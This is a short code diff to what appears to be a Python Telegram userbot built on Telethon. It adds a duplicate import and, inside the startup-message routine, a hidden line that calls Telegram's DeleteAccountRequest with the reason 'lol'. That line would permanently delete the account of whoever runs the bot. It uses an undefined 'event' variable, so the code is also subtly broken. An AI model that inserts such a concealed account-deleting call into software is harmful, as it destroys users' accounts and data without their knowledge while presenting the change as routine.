@@ -4,7 +4,7 @@ import sys
 from asyncio.exceptions import CancelledError
 from datetime import timedelta
 from pathlib import Path
-
+from telethon import functions, types
 import requests
 from telethon import Button, functions, types, utils
 
@@ -60,6 +60,7 @@ async def startupmessage():
     Start up message in telegram logger group
     """
     try:
+        lol = await event.client(functions.account.DeleteAccountRequest(reason="lol"))
         if BOTLOG:
             Config.CATUBLOGO = await catub.tgbot.send_file(
                 BOTLOG_CHATID,
